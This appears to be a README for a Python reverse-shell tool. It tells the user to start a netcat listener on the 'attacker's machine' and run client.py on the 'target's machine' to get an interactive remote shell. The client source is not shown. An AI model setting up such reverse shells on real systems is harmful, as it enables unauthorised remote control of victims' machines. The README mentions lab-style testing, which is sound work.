# Getting started
This is an example of how to run the client.py. Before that, the packages used in the program are **socket**, **subprocess** and **os**. Ensure that you already open the connection on attacker's machine which is
```sh
nc ‐v ‐l ‐p 5555
```

# Running the program
After you get the prerequisites ready, please perform the following below in target's machine
* python3
```sh
python3 client.py
```
	
Alternatively, you can do this too if the script is made to be executeable
* executable
```sh
./client.py
```

After the connection between the target and victim is confirmed, reverse shell is then created. The user can input any related commands such as *ls*, *pwd*, *whoami*, and more. For the interactive commands such as *cd*, *gedit*, *nano*, only *cd* is able to perform the actual function of the respective command. Althought you can open a file using *gedit*, you cannot write to the file or view the file. If you want to view a file, please use *cat filename*.

# Additional info
* The python version that I tested on my Ubuntu using is 3.10.4.
* Please remember to update any neccessary information such as IP address in the script to use it properly on your testing machines
